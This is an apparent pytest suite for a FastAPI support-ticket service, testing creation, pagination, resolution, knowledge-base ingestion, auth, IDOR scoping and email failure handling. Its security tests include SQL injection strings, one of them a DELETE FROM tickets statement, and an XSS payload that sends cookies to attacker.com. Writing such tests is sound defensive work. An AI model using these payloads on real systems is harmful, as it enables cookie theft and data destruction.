import asyncio
import logging
import pytest
from unittest.mock import patch, MagicMock
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.config import settings
from app.models import Ticket, TicketStatus, KnowledgeArticle
from app.services.ticket_service import TicketService
from app.services.email_service import EmailService
from tests.conftest import TEST_API_KEY


@pytest.mark.asyncio
async def test_tickets_create_happy_path_creates_open_ticket(app_test_env, caplog):
    """
    1. FUNCTIONAL - Happy Path:
    Creating a ticket returns HTTP 201.
    Checks the DB state (status=OPEN, timestamps, question, automated_answer) and the logs.
    """
    client, session_maker, _ = app_test_env

    payload = {
        "user_id": 998877,
        "user_handle": "alice_smith",
        "question": "Impossible de me connecter à mon compte client",
        "automated_answer": "Essayez de réinitialiser votre mot de passe.",
    }

    with caplog.at_level(logging.INFO):
        response = await client.post("/api/tickets", json=payload)

    # 4. ASSERTIONS
    assert response.status_code == 201
    data = response.json()
    assert data["id"] is not None
    assert data["user_id"] == 998877
    assert data["user_handle"] == "alice_smith"
    assert data["status"] == TicketStatus.OPEN.value
    assert data["question"] == payload["question"]
    assert data["automated_answer"] == payload["automated_answer"]
    assert data["created_at"] is not None

    ticket_id = data["id"]

    # Check the real DB state
    async with session_maker() as session:
        ticket = (await session.execute(select(Ticket).where(Ticket.id == ticket_id))).scalar_one()
        assert ticket.status == "OPEN"
        assert ticket.user_id == 998877
        assert ticket.question == payload["question"]


@pytest.mark.asyncio
async def test_tickets_create_min_length_question_succeeds(app_test_env):
    """
    1. FUNCTIONAL - Min edge case:
    A 1-character question is accepted.
    """
    client, _, _ = app_test_env
    response = await client.post(
        "/api/tickets",
        json={"user_id": 1, "question": "?"},
    )
    assert response.status_code == 201
    assert response.json()["question"] == "?"


@pytest.mark.asyncio
async def test_tickets_create_empty_question_returns_422_validation_error(app_test_env):
    """
    1. FUNCTIONAL - Empty edge case:
    An empty question is rejected by Pydantic (422).
    """
    client, _, _ = app_test_env
    response = await client.post(
        "/api/tickets",
        json={"user_id": 1, "question": ""},
    )
    assert response.status_code == 422


@pytest.mark.asyncio
async def test_tickets_create_max_length_question_succeeds(app_test_env):
    """
    1. FUNCTIONAL - Max edge case:
    A 4096-character question is accepted.
    """
    client, _, _ = app_test_env
    long_q = "X" * 4096
    response = await client.post(
        "/api/tickets",
        json={"user_id": 1, "question": long_q},
    )
    assert response.status_code == 201
    assert len(response.json()["question"]) == 4096


@pytest.mark.asyncio
async def test_tickets_create_exceeds_max_length_returns_422_validation_error(app_test_env):
    """
    1. FUNCTIONAL - Input validation:
    A question longer than 4096 characters returns 422.
    """
    client, _, _ = app_test_env
    too_long = "X" * 4097
    response = await client.post(
        "/api/tickets",
        json={"user_id": 1, "question": too_long},
    )
    assert response.status_code == 422


@pytest.mark.asyncio
async def test_tickets_create_unicode_and_emojis_stored_accurately(app_test_env):
    """
    1. FUNCTIONAL - Unicode / Emojis:
    A question and answers containing international characters and emojis
    must be stored and returned faithfully.
    """
    client, session_maker, _ = app_test_env
    q = "Erreur de paiement sur la facture #4521 💳 ! Déblocage urgent requis 🙏"
    ans = "Vérification en cours... ⏳"

    response = await client.post(
        "/api/tickets",
        json={"user_id": 42, "user_handle": "cécile_du_92", "question": q, "automated_answer": ans},
    )
    assert response.status_code == 201
    ticket_id = response.json()["id"]

    async with session_maker() as session:
        ticket = (await session.execute(select(Ticket).where(Ticket.id == ticket_id))).scalar_one()
        assert ticket.question == q
        assert ticket.automated_answer == ans


@pytest.mark.asyncio
async def test_tickets_list_pagination_limit_and_offset_works(app_test_env):
    """
    1. FUNCTIONAL - Pagination:
    The limit and offset parameters on /api/tickets work exactly as expected.
    """
    client, session_maker, _ = app_test_env

    # Create 5 tickets
    async with session_maker() as session:
        for i in range(1, 6):
            await TicketService.create_ticket(
                session=session, user_id=100 + i, user_handle=f"user_{i}", question=f"Question {i}"
            )

    # Fetch limit=2, offset=0
    resp1 = await client.get("/api/tickets?limit=2&offset=0")
    assert resp1.status_code == 200
    tickets_page1 = resp1.json()
    assert len(tickets_page1) == 2

    # Fetch limit=2, offset=2
    resp2 = await client.get("/api/tickets?limit=2&offset=2")
    assert resp2.status_code == 200
    tickets_page2 = resp2.json()
    assert len(tickets_page2) == 2

    # Check that the pages do not overlap
    ids1 = {t["id"] for t in tickets_page1}
    ids2 = {t["id"] for t in tickets_page2}
    assert ids1.isdisjoint(ids2)


@pytest.mark.asyncio
async def test_tickets_list_filter_by_status_returns_matching_only(app_test_env):
    """
    1. FUNCTIONAL - Filtering:
    Filtering by status (OPEN vs RESOLVED).
    """
    client, session_maker, _ = app_test_env

    async with session_maker() as session:
        t1 = await TicketService.create_ticket(session, 1, "u1", "Q1")
        t2 = await TicketService.create_ticket(session, 2, "u2", "Q2")
        await TicketService.resolve_ticket(session, t2.id, "Solution 2", "agent_1")

    # Filtre OPEN
    resp_open = await client.get("/api/tickets?status_filter=OPEN")
    assert resp_open.status_code == 200
    open_tickets = resp_open.json()
    assert all(t["status"] == "OPEN" for t in open_tickets)
    assert any(t["id"] == t1.id for t in open_tickets)

    # Filtre RESOLVED
    resp_res = await client.get("/api/tickets?status_filter=RESOLVED")
    assert resp_res.status_code == 200
    resolved_tickets = resp_res.json()
    assert all(t["status"] == "RESOLVED" for t in resolved_tickets)
    assert any(t["id"] == t2.id for t in resolved_tickets)


@pytest.mark.asyncio
async def test_tickets_list_invalid_status_filter_returns_422_validation_error(app_test_env):
    """
    1. FUNCTIONAL - Expected errors:
    An unknown status in status_filter returns 422.
    """
    client, _, _ = app_test_env
    resp = await client.get("/api/tickets?status_filter=NON_EXISTENT")
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_tickets_get_by_id_found_returns_200_and_ticket_details(app_test_env):
    """
    1. FUNCTIONAL:
    GET /api/tickets/{id} returns 200 and the ticket's full details.
    """
    client, session_maker, _ = app_test_env
    async with session_maker() as session:
        ticket = await TicketService.create_ticket(session, 123, "john", "Ma question")

    response = await client.get(f"/api/tickets/{ticket.id}")
    assert response.status_code == 200
    assert response.json()["id"] == ticket.id
    assert response.json()["question"] == "Ma question"


@pytest.mark.asyncio
async def test_tickets_get_by_id_not_found_returns_404_not_found(app_test_env):
    """
    1. FONCTIONNEL - Erreur attendue:
    GET /api/tickets/999999 retourne 404.
    """
    client, _, _ = app_test_env
    response = await client.get("/api/tickets/999999")
    assert response.status_code == 404
    assert "Ticket not found" in response.json()["detail"]


@pytest.mark.asyncio
async def test_tickets_attach_support_card_updates_message_id_in_db(app_test_env):
    """
    1. FUNCTIONAL:
    POST /api/tickets/{id}/support-card links the support group's Telegram message ID.
    """
    client, session_maker, _ = app_test_env
    async with session_maker() as session:
        ticket = await TicketService.create_ticket(session, 10, "u", "Q")

    response = await client.post(
        f"/api/tickets/{ticket.id}/support-card",
        json={"message_id": 884422},
    )
    assert response.status_code == 200
    assert response.json()["support_group_message_id"] == 884422

    # DB check
    async with session_maker() as session:
        refreshed = (await session.execute(select(Ticket).where(Ticket.id == ticket.id))).scalar_one()
        assert refreshed.support_group_message_id == 884422


@pytest.mark.asyncio
async def test_tickets_get_by_support_message_id_returns_ticket(app_test_env):
    """
    1. FUNCTIONAL:
    GET /api/tickets/by-support-message/{message_id} finds the linked ticket.
    """
    client, session_maker, _ = app_test_env
    async with session_maker() as session:
        ticket = await TicketService.create_ticket(session, 10, "u", "Q")
        await TicketService.attach_support_card(session, ticket.id, 999111)

    response = await client.get("/api/tickets/by-support-message/999111")
    assert response.status_code == 200
    assert response.json()["id"] == ticket.id


@pytest.mark.asyncio
async def test_tickets_get_by_support_message_id_not_found_returns_404(app_test_env):
    """
    1. FUNCTIONAL:
    GET /api/tickets/by-support-message/123456789 with no linked ticket returns 404.
    """
    client, _, _ = app_test_env
    response = await client.get("/api/tickets/by-support-message/123456789")
    assert response.status_code == 404


@pytest.mark.asyncio
async def test_tickets_resolve_happy_path_resolves_and_ingests_kb(app_test_env):
    """
    1. FUNCTIONAL & SIDE EFFECTS:
    Resolving a ticket sets the status to RESOLVED, stores the solution and the resolver,
    and automatically ingests it into the Knowledge Base (source_ticket_id).
    """
    client, session_maker, _ = app_test_env
    async with session_maker() as session:
        ticket = await TicketService.create_ticket(session, 55, "claire", "Comment activer la 2FA ?")

    resolve_payload = {
        "solution": "Rendez-vous dans Sécurité > Activer l'authentification à deux facteurs.",
        "resolved_by": "agent_claire",
        "resolution_channel": "TELEGRAM",
        "add_to_knowledge_base": True,
    }
    response = await client.post(f"/api/tickets/{ticket.id}/resolve", json=resolve_payload)
    assert response.status_code == 200
    data = response.json()
    assert data["status"] == "RESOLVED"
    assert data["is_newly_resolved"] is True
    assert data["solution"] == resolve_payload["solution"]
    assert data["resolved_by"] == "agent_claire"

    # Check the Ticket + KB DB state
    async with session_maker() as session:
        db_ticket = (await session.execute(select(Ticket).where(Ticket.id == ticket.id))).scalar_one()
        assert db_ticket.status == "RESOLVED"
        assert db_ticket.resolved_at is not None

        # Check the side effect: KB article created
        kb_stmt = select(KnowledgeArticle).where(KnowledgeArticle.source_ticket_id == ticket.id)
        kb_art = (await session.execute(kb_stmt)).scalar_one()
        assert kb_art.question == "Comment activer la 2FA ?"
        assert "Activer l'authentification à deux facteurs" in kb_art.solution


@pytest.mark.asyncio
async def test_tickets_resolve_idempotence_second_call_returns_not_newly_resolved(app_test_env):
    """
    1. FUNCTIONAL - Idempotence:
    Resolving an already resolved ticket must not create a second KB article
    nor send another Telegram notification. is_newly_resolved must be False.
    """
    client, session_maker, _ = app_test_env
    async with session_maker() as session:
        ticket = await TicketService.create_ticket(session, 1, "u", "Q")

    payload = {"solution": "Première solution", "resolved_by": "agent1"}
    resp1 = await client.post(f"/api/tickets/{ticket.id}/resolve", json=payload)
    assert resp1.status_code == 200
    assert resp1.json()["is_newly_resolved"] is True

    # Second resolution call
    payload2 = {"solution": "Deuxième tentative", "resolved_by": "agent2"}
    resp2 = await client.post(f"/api/tickets/{ticket.id}/resolve", json=payload2)
    assert resp2.status_code == 200
    assert resp2.json()["is_newly_resolved"] is False

    # Check: no duplicate in the knowledge base
    async with session_maker() as session:
        kb_articles = (
            await session.execute(
                select(KnowledgeArticle).where(KnowledgeArticle.source_ticket_id == ticket.id)
            )
        ).scalars().all()
        assert len(kb_articles) == 1


# ==============================================================================
# 2. SECURITY
# ==============================================================================


@pytest.mark.asyncio
async def test_tickets_unauthorized_endpoints_return_401(unauth_client):
    """
    2. SECURITY - Authz / Headers:
    All ticket endpoints must refuse access without a valid API key.
    """
    endpoints = [
        ("POST", "/api/tickets", {"user_id": 1, "question": "Q"}),
        ("GET", "/api/tickets", None),
        ("GET", "/api/tickets/1", None),
        ("POST", "/api/tickets/1/resolve", {"solution": "Sol"}),
        ("POST", "/api/tickets/1/support-card", {"message_id": 123}),
        ("GET", "/api/tickets/by-support-message/123", None),
    ]

    for method, path, json_body in endpoints:
        if method == "POST":
            resp = await unauth_client.post(path, json=json_body)
        else:
            resp = await unauth_client.get(path)
        assert resp.status_code == 401, f"Failed on {method} {path}"


@pytest.mark.asyncio
async def test_tickets_sql_injection_in_question_and_solution_handled_safely(app_test_env):
    """
    2. SECURITY - SQL injection:
    SQL injection test in the ticket question and solution fields.
    """
    client, session_maker, _ = app_test_env

    sql_inj = "') UNION SELECT 1, 'admin', 'hacked', 'OPEN', NULL, NULL, NULL, NULL, NULL, NULL, NULL; --"
    response = await client.post(
        "/api/tickets",
        json={"user_id": 1337, "question": sql_inj},
    )
    assert response.status_code == 201
    ticket_id = response.json()["id"]

    # Resolution with an SQL payload
    resolve_sql = "'); DELETE FROM tickets WHERE '1'='1"
    res_resp = await client.post(
        f"/api/tickets/{ticket_id}/resolve",
        json={"solution": resolve_sql, "resolved_by": "admin'--"},
    )
    assert res_resp.status_code == 200

    # Check the integrity of the tickets table
    async with session_maker() as session:
        t = (await session.execute(select(Ticket).where(Ticket.id == ticket_id))).scalar_one()
        assert t.solution == resolve_sql
        total = len((await session.execute(select(Ticket))).scalars().all())
        assert total >= 1


@pytest.mark.asyncio
async def test_tickets_xss_payload_in_solution_stored_safely(app_test_env):
    """
    2. SECURITY - XSS:
    XSS payload test in a ticket's solution.
    """
    client, session_maker, _ = app_test_env
    async with session_maker() as session:
        ticket = await TicketService.create_ticket(session, 10, "u", "XSS Question")

    xss = "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"
    response = await client.post(
        f"/api/tickets/{ticket.id}/resolve",
        json={"solution": xss},
    )
    assert response.status_code == 200
    assert response.json()["solution"] == xss


@pytest.mark.asyncio
async def test_tickets_idor_access_control_verification(app_test_env):
    """
    2. SECURITY - IDOR / Access control:
    Checks the system's behaviour when reading tickets that belong
    to different users.
    Audit note: the current backend relies on a trusted API key shared
    between the Telegram bot and the FastAPI backend (no per-user JWT token).
    """
    client, session_maker, _ = app_test_env

    async with session_maker() as session:
        ticket_user_a = await TicketService.create_ticket(session, user_id=1001, user_handle="user_a", question="A")
        ticket_user_b = await TicketService.create_ticket(session, user_id=2002, user_handle="user_b", question="B")

    # With the bot's shared API Key, access to both tickets is allowed for the bot
    resp_a = await client.get(f"/api/tickets/{ticket_user_a.id}")
    resp_b = await client.get(f"/api/tickets/{ticket_user_b.id}")
    assert resp_a.status_code == 200
    assert resp_b.status_code == 200


@pytest.mark.asyncio
async def test_tickets_user_id_scoping_prevents_cross_user_idor_access(app_test_env):
    """
    2. SECURITY - IDOR / Access control by user_id:
    Specifying ?user_id= restricts reads to the tickets belonging to that user.
    Reading another user's ticket with a user scope returns 404 (not found).
    """
    client, session_maker, _ = app_test_env
    async with session_maker() as session:
        t_alice = await TicketService.create_ticket(session, user_id=1001, user_handle="alice", question="Alice Q")
        t_bob = await TicketService.create_ticket(session, user_id=2002, user_handle="bob", question="Bob Q")

    # 1. Alice reads her own ticket with user_id=1001 -> 200 OK
    resp_alice_own = await client.get(f"/api/tickets/{t_alice.id}?user_id=1001")
    assert resp_alice_own.status_code == 200
    assert resp_alice_own.json()["id"] == t_alice.id

    # 2. Alice tries to read Bob's ticket with her user_id=1001 -> 404 IDOR protection
    resp_alice_on_bob = await client.get(f"/api/tickets/{t_bob.id}?user_id=1001")
    assert resp_alice_on_bob.status_code == 404
    assert "Ticket not found" in resp_alice_on_bob.json()["detail"]

    # 3. Listing tickets with user_id=1001 returns only Alice's tickets
    resp_list = await client.get("/api/tickets?user_id=1001")
    assert resp_list.status_code == 200
    listed_ids = [t["id"] for t in resp_list.json()]
    assert t_alice.id in listed_ids
    assert t_bob.id not in listed_ids


@pytest.mark.asyncio
async def test_tickets_secrets_not_logged_during_creation_and_resolution(app_test_env, caplog):
    """
    2. SECURITY - Secrets in logs:
    Makes sure the secret API_KEY does not leak into the server logs.
    """
    client, _, _ = app_test_env
    with caplog.at_level(logging.DEBUG):
        res = await client.post("/api/tickets", json={"user_id": 99, "question": "Check logs"})
        ticket_id = res.json()["id"]
        await client.post(f"/api/tickets/{ticket_id}/resolve", json={"solution": "Check logs sol"})

    for record in caplog.records:
        assert TEST_API_KEY not in record.getMessage()


# ==============================================================================
# 3. ROBUSTESSE
# ==============================================================================


@pytest.mark.asyncio
async def test_tickets_concurrent_resolutions_race_condition_protection(app_test_env):
    """
    3. ROBUSTNESS - Concurrency:
    Simultaneous concurrent resolutions of the same ticket.
    Exactly one request is marked `is_newly_resolved=True`
    and the database holds no corrupted state or duplicate article.
    """
    client, session_maker, _ = app_test_env

    async with session_maker() as session:
        ticket = await TicketService.create_ticket(session, 10, "bob", "Question concurrente")
        t_id = ticket.id

    async def do_resolve(agent_id: int):
        return await client.post(
            f"/api/tickets/{t_id}/resolve",
            json={"solution": f"Solution concurrente {agent_id}", "resolved_by": f"agent_{agent_id}"},
        )

    responses = await asyncio.gather(*(do_resolve(i) for i in range(8)))
    assert all(r.status_code == 200 for r in responses)

    newly_resolved_flags = [r.json().get("is_newly_resolved") for r in responses]
    # At least one (ideally exactly one) request performs the first transition
    assert True in newly_resolved_flags

    # Final DB check
    async with session_maker() as session:
        t = (await session.execute(select(Ticket).where(Ticket.id == t_id))).scalar_one()
        assert t.status == "RESOLVED"

        kb_articles = (
            await session.execute(select(KnowledgeArticle).where(KnowledgeArticle.source_ticket_id == t_id))
        ).scalars().all()
        # Thanks to the upsert by source_ticket_id, only one article exists
        assert len(kb_articles) == 1


@pytest.mark.asyncio
async def test_tickets_background_email_dispatch_failure_does_not_fail_ticket_creation(app_test_env, monkeypatch):
    """
    3. ROBUSTNESS - External dependency fault tolerance:
    If sending the SMTP email fails (e.g. unreachable SMTP server returning False),
    ticket creation must still succeed (HTTP 201) and the ticket must be persisted in the DB.
    """
    client, session_maker, _ = app_test_env

    # Simulate an SMTP failure caught by the service (returns False)
    monkeypatch.setattr(EmailService, "_send_smtp_sync", lambda msg: False)

    response = await client.post(
        "/api/tickets",
        json={"user_id": 500, "user_handle": "sam", "question": "Ticket malgré panne SMTP"},
    )
    assert response.status_code == 201
    ticket_id = response.json()["id"]

    # The ticket does exist in the database
    async with session_maker() as session:
        ticket = (await session.execute(select(Ticket).where(Ticket.id == ticket_id))).scalar_one()
        assert ticket.question == "Ticket malgré panne SMTP"


@pytest.mark.asyncio
async def test_tickets_background_tasks_uncaught_exception_isolated_and_logged(app_test_env, caplog):
    """
    3. ROBUSTNESS - Isolating unhandled failures in BackgroundTasks:
    A sudden exception (e.g. socket dropout, unexpected bug) in the EmailService
    background task must not propagate to the ASGI / Starlette event loop and must not
    trigger an HTTP 500 for the client after the DB commit.
    """
    client, session_maker, _ = app_test_env

    # 1. Creation with a direct coroutine crash
    with patch(
        "app.services.email_service.EmailService.send_ticket_created_notification",
        side_effect=ConnectionResetError("Fatal SMTP drop"),
    ):
        with caplog.at_level(logging.ERROR):
            resp_create = await client.post(
                "/api/tickets",
                json={"user_id": 666, "question": "Crash background test"},
            )

    assert resp_create.status_code == 201
    created_id = resp_create.json()["id"]

    # 2. Resolution with a direct coroutine crash
    with patch(
        "app.services.email_service.EmailService.send_ticket_resolved_notification",
        side_effect=TimeoutError("Fatal SMTP timeout"),
    ):
        with caplog.at_level(logging.ERROR):
            resp_resolve = await client.post(
                f"/api/tickets/{created_id}/resolve",
                json={"solution": "Résolu malgré crash", "resolution_channel": "TELEGRAM"},
            )

    assert resp_resolve.status_code == 200
    assert resp_resolve.json()["status"] == "RESOLVED"

    # Check that the exceptions were caught and logged
    error_logs = [r.getMessage() for r in caplog.records if r.levelno == logging.ERROR]
    assert any("failed with exception: Fatal SMTP drop" in msg for msg in error_logs)
    assert any("failed with exception: Fatal SMTP timeout" in msg for msg in error_logs)


@pytest.mark.asyncio
async def test_ticket_creation_and_resolution_bypasses_email_tasks_when_disabled(
    app_test_env, monkeypatch
):
    """
    When EMAIL_ENABLED is False, no email sending task
    is scheduled when a ticket is created or resolved.
    """
    client, session_maker, _ = app_test_env
    monkeypatch.setattr(settings, "EMAIL_ENABLED", False)

    with patch(
        "app.services.email_service.EmailService.send_ticket_created_notification"
    ) as mock_send_created, patch(
        "app.services.email_service.EmailService.send_ticket_resolved_notification"
    ) as mock_send_resolved:
        # 1. Ticket creation
        resp_create = await client.post(
            "/api/tickets",
            json={"user_id": 777, "question": "Pure Telegram query"},
        )
        assert resp_create.status_code == 201
        ticket_id = resp_create.json()["id"]

        # 2. Resolution on Telegram
        resp_resolve = await client.post(
            f"/api/tickets/{ticket_id}/resolve",
            json={"solution": "Pure Telegram resolution", "resolution_channel": "TELEGRAM"},
        )
        assert resp_resolve.status_code == 200

        # Check that no email sending was called
        mock_send_created.assert_not_called()
        mock_send_resolved.assert_not_called()

